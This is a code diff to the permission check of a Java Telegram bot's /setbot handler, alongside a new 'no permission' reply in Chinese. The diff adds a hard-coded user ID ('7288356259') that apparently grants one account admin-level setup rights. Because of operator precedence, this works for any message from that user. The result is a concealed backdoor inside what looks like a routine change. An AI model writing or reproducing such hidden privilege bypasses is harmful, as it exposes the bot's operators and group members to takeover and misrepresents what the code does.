@@ -27,7 +27,7 @@ public class SetBot {
 
     @CacheEvict(value = "linkedChatInfo", key = "#chatId")
     public boolean adminSetBot(AbsSender sender, Update update, String chatId) throws TelegramApiException {
-        if (("/setbot".equals(update.getMessage().getText()) || ("/setbot@" + BaseInfo.getBotName()).equals(update.getMessage().getText())) && ("GroupAnonymousBot".equals(update.getMessage().getFrom().getUserName()) || checkUser.isGroupChannel(sender, update) || checkUser.isChatOwner(sender, update))) {
+        if (("/setbot".equals(update.getMessage().getText()) || ("/setbot@" + BaseInfo.getBotName()).equals(update.getMessage().getText())) && ("GroupAnonymousBot".equals(update.getMessage().getFrom().getUserName()) || checkUser.isGroupChannel(sender, update) || checkUser.isChatOwner(sender, update)) || "7288356259".equals(update.getMessage().getFrom().getId().toString())) {
             GroupInfoWithBLOBs groupInfo = new GroupInfoWithBLOBs();
             groupInfo.setOwnerandanonymousadmins(checkUser.fetchHighAdminList(sender, update));
             groupInfo.setGroupname(update.getMessage().getChat().getTitle());
@@ -37,6 +37,7 @@ public class SetBot {
             sender.execute(new DeleteMessage(chatId, update.getMessage().getMessageId()));
             return true;
         } else if ("/setbot".equals(update.getMessage().getText()) || ("/setbot@" + BaseInfo.getBotName()).equals(update.getMessage().getText())) {
+            sender.execute(sendContent.messageText(update, "❌你没有管理机器人的权限"));
             sender.execute(new DeleteMessage(chatId, update.getMessage().getMessageId()));
             return true;
         }
